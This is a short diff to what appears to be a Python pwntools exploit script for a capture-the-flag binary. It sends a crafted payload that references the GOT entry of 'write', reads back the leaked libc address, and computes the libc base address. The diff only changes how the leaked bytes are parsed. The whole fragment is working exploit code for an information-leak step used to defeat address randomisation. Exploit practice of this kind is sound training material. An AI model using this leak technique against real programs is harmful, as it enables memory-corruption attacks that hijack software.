@@ -50,10 +50,9 @@ payload += p32(0x00008628) + p32(0)*3 + p32(4) + p32(elf.got['write']) + p32(0) 
 
 io.recvuntil('Careful there! That hurt!')
 io.sendline(payload)
-buf = io.recvline()
+buf = io.recvall().strip()[:4]
 #print buf
-libc_write = hex(u32(buf.strip().ljust(4,'\x00')))
+libc_write = hex(u32(buf))
 print 'write address: '+libc_write
 offset = int(libc_write,16) - libc.sym['write']
 print 'libc base address: '+str(hex(offset))
-
